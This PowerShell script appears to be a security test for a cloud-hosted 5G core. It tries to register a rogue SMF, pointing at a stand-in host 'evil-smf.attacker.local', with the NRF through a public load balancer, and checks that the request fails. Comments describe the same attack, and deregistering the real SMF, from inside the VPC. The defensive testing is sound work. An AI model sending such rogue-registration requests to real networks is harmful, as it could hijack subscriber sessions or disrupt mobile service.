# 06-rogue-nrf.ps1
# Simulation: Attempt to register a rogue NF with the NRF.
#
# From the INTERNET: NRF is not exposed on the ALB, so requests to /nnrf-nfm/* or
# /nnrf-disc/* will hit the ALB and get 404 (no route). This script demonstrates
# that the mitigation (no ALB route to NRF) works.
#
# From INSIDE the VPC (e.g. EC2, Lambda, or a compromised NF): An attacker could
# call NRF at http://nrf.core.local:8080 and register a rogue NF (e.g. fake SMF),
# or deregister the real SMF. This script tries the public ALB; for internal
# simulation you would run from a host that can resolve nrf.core.local.
#
# Usage: $ALB_DNS = "your-alb"; .\06-rogue-nrf.ps1

param(
    [Parameter(Mandatory=$false)]
    [string]$BaseUrl = $env:ALB_DNS
)

if (-not $BaseUrl) { Write-Error "Set `$ALB_DNS or pass -BaseUrl"; exit 1 }
$base = "http://$BaseUrl"

Write-Host "=== Attack 6: Rogue NF registration (NRF) ===" -ForegroundColor Yellow
Write-Host "Attempting to register a rogue SMF via the ALB (NRF is not exposed)...`n"

$rogueId = [guid]::NewGuid().ToString()
$body = @{
    nfType = "SMF"
    fqdn = "evil-smf.attacker.local"
    nfServices = @(@{ serviceName = "nsmf-pdusession"; scheme = "http" })
} | ConvertTo-Json

try {
    $r = Invoke-WebRequest -UseBasicParsing -Method PUT `
        -Uri "$base/nnrf-nfm/v1/nf-instances/$rogueId" `
        -Headers @{"Content-Type"="application/json"; "x-trace-id"="attack-rogue-nf"} `
        -Body $body
    Write-Host "RESULT: Rogue NF registration ACCEPTED (vulnerable)." -ForegroundColor Red
    $r.Content
} catch {
    $code = $_.Exception.Response.StatusCode.value__
    if ($code -eq 404 -or $_.Exception.Message -match "404|No route") {
        Write-Host "RESULT: NRF not reachable via ALB (404 / no route). Mitigation in place." -ForegroundColor Green
        Write-Host "From inside VPC, attacker could still call http://nrf.core.local:8080 to register rogue NF."
    } else {
        Write-Host "Request failed: $code $_" -ForegroundColor Gray
    }
}
